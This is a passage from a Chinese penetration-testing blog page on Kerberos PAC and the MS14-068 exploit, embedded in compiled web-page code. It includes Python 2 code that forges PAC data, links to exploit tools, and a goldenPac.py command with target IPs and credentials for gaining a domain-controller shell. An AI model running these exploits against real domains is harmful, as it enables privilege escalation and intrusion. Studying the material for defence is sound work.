<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    ad1[</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">][</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;ad-type&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> authorization_data[</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    ad1[</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">][</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;ad-data&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> authorization_data[</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    ad </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;"> AuthorizationData</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    ad[</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> None</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    ad[</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">][</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;ad-type&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;"> AD_IF_RELEVANT</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    ad[</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">][</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;ad-data&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;"> encode</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(ad1)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    data </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;"> encode</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(ad)</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    with</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> open</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;jack.pac&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;wb&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">as</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> f:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        f.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">write</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(data)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">注意这里的运行环境是python2</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>导入PAC，申请TGS票据</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/2.png" alt="2" tabindex="0" loading="lazy"><figcaption>2</figcaption></figure></li></ul><p>因为申请的是krbtgt服务，因此导出的TGS票据可以当作TGT使用</p><ul><li><p>在低权限主机上导入该票据，并开启一个cmdshell</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/3.png" alt="3" tabindex="0" loading="lazy"><figcaption>3</figcaption></figure></li></ul><h3 id="脚本利用" tabindex="-1"><a class="header-anchor" href="#脚本利用"><span>脚本利用</span></a></h3><p>Pykek</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>py：https://github.com/mubix/pykek</span></span>
<span class="line"><span>exe：https://github.com/ianxtianxt/MS14-068</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/4.png" alt="4" tabindex="0" loading="lazy"><figcaption>4</figcaption></figure><p>glodenPAC</p><p>psexec和ms14068结合的产物</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span> python goldenPac.py -dc-ip 192.168.30.10 -target-ip 192.168.30.10 hack.com/hacker:\\!qaz@WSX@DC.hack.com</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div>`,35)]))}const d=i(l,[["render",h],["__file","PAC.html.vue"]]),r=JSON.parse('{"path":"/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Kerberos%E4%B8%93%E9%A2%98/PAC.html","title":"PAC介绍","lang":"zh-CN","frontmatter":{"description":"PAC介绍 PAC由微软为了访问控制而引入，用于解决用户是否有权限访问目标服务的验证 在AS_REQ流程中，请求凭据是用户hash加密的内容，如果解密正确KDC会返回krbtgt hash加密的TGT，TGT中就包含了PAC，PAC中包含了用户的sid,用户所在的组 在TGS_REQ流程中，用户原样返回TGT票据附带时间戳等信息，KDC使用krbtgt...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/articles/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Kerberos%E4%B8%93%E9%A2%98/PAC.html"}],["meta",{"property":"og:site_name","content":"uu2fu3o的知识库"}],["meta",{"property":"og:title","content":"PAC介绍"}],["meta",{"property":"og:description","content":"PAC介绍 PAC由微软为了访问控制而引入，用于解决用户是否有权限访问目标服务的验证 在AS_REQ流程中，请求凭据是用户hash加密的内容，如果解密正确KDC会返回krbtgt hash加密的TGT，TGT中就包含了PAC，PAC中包含了用户的sid,用户所在的组 在TGS_REQ流程中，用户原样返回TGT票据附带时间戳等信息，KDC使用krbtgt..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/image001.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-15T18:41:02.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-15T18:41:02.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"PAC介绍\\",\\"image\\":[\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/image001.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/1.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/2.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/3.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/4.png\\"],\\"dateModified\\":\\"2025-01-15T18:41:02.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"uu2fu3o\\",\\"url\\":\\"https://mister-hope.com\\"}]}"]]},"headers":[{"level":2,"title":"PAC结构","slug":"pac结构","link":"#pac结构","children":[]},{"level":2,"title":"MS14068","slug":"ms14068","link":"#ms14068","children":[{"level":3,"title":"脚本利用","slug":"脚本利用","link":"#脚本利用","children":[]}]}],"git":{"createdTime":1736966462000,"updatedTime":1736966462000,"contributors":[{"name":"uu2fu3o","username":"uu2fu3o","email":"1027578439@qq.com","commits":1,"url":"https://github.com/uu2fu3o"}]},"readingTime":{"minutes":7.32,"words":2196},"filePathRelative":"渗透测试/Kerberos专题/PAC.md","localizedDate":"2025年1月16日","excerpt":"\\n<p>PAC由微软为了访问控制而引入，用于解决用户是否有权限访问目标服务的验证</p>\\n<ul>\\n<li>在AS_REQ流程中，请求凭据是用户hash加密的内容，如果解密正确KDC会返回krbtgt hash加密的TGT，TGT中就包含了PAC，PAC中包含了用户的sid,用户所在的组</li>\\n<li>在TGS_REQ流程中，用户原样返回TGT票据附带时间戳等信息，KDC使用krbtgt hash进行解密，成功则返回服务hash 加密的TGS票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据，这也是kerberoating能利用的原因，任何一个用户，只要hash正确，可以请求域内任何一个服务的TGS票据)</li>\\n<li>服务使用自身的hash解密用户发来的TGS票据，使用其中的PAC去KDC询问用户是否有权限访问该服务，**域控解密PAC。获取用户的sid，以及所在的组，再判断用户是否有访问服务的权限，有访问权限(有些服务并没有验证PAC这一步，这也是白银票据能成功的前提，因为就算拥有用户hash，可以制作TGS，也不能制作PAC，PAC当然也验证不成功，但是有些服务不去验证PAC，这是白银票据成功的前提）**就允许用户访问。</li>\\n</ul>","autoDesc":true}');export{d as comp,r as data};
